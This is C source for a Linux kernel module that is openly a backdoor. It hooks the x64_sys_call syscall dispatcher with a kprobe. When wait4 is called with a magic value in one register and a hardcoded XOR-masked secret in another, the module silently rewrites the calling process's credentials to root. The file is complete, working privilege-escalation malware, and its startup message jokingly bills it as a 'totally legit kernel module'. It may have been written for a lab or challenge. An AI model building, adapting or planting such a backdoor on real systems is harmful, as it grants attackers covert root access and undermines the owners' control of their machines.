#include<linux/init.h>
#include<linux/module.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/uaccess.h>  // for copy_from_user

MODULE_LICENSE("GPL");
MODULE_AUTHOR("miam");

volatile int DEBUG = 0;
volatile uint64_t SECRET = 0x48455841;

static struct kprobe kp = {
	.symbol_name	= "x64_sys_call",
};

static void print_alert(const char * str)
{
    printk(KERN_ALERT "BD: %s\n", str);
}

static void make_current_process_root(void)
{
    print_alert("Making current process root");
    *(uid_t *)&current->cred->uid = 0;
    *(gid_t *)&current->cred->gid = 0;

    *(uid_t *)&current->cred->suid = 0;
    *(gid_t *)&current->cred->sgid = 0;

    *(uid_t *)&current->cred->euid = 0;
    *(gid_t *)&current->cred->egid = 0;

    *(uid_t *)&current->cred->fsuid = 0;
    *(gid_t *)&current->cred->fsgid = 0;
}

static int check_syscall_number(uint64_t id)
{
    if (id == 61)
    {
        return 1;
    }
    return 0;
}

static int __attribute__((no_sanitize("undefined"))) check_syscall_args(uint64_t arg0, uint64_t arg1)
{
    if (arg0 == 0x777)
    {
        if (DEBUG) 
        {
            print_alert("arg0 (rdi) is the correct magic value");
        }

        print_alert("Checking secret in arg1 (rsi)");

        if ((arg1 ^ 0x29302c29) == SECRET)
        {
            return 1;
        }            
    }
    return 0;
}

static int __attribute__((no_sanitize("undefined"))) handler_pre_syscall(struct kprobe *p, struct pt_regs *regs)
{
    uint64_t syscall_id = regs->si;
    struct pt_regs * syscall_regs = (struct pt_regs *)regs->di;
    uint64_t arg0 = syscall_regs->di;
    uint64_t arg1 = syscall_regs->si;
    asm volatile ("" ::: "memory");  // Optimization barrier

    if (check_syscall_number(syscall_id))
    {
        if (DEBUG) 
        {
            print_alert("Received backdoored syscall wait4");
        }
        if (check_syscall_args(arg0, arg1))
        {
            make_current_process_root();
        }
    }
	return 0;
}

static int backdoor_init(void){
    print_alert("Starting totally legit kernel module!");
    int ret;
	kp.pre_handler = handler_pre_syscall;

	ret = register_kprobe(&kp);
	if (ret < 0) {
		print_alert("Register_kprobe failed");
		return ret;
	}
    return 0;
}

static void backdoor_exit(void){
    unregister_kprobe(&kp);
    print_alert("Driver unloaded");
}

module_init(backdoor_init);
module_exit(backdoor_exit);
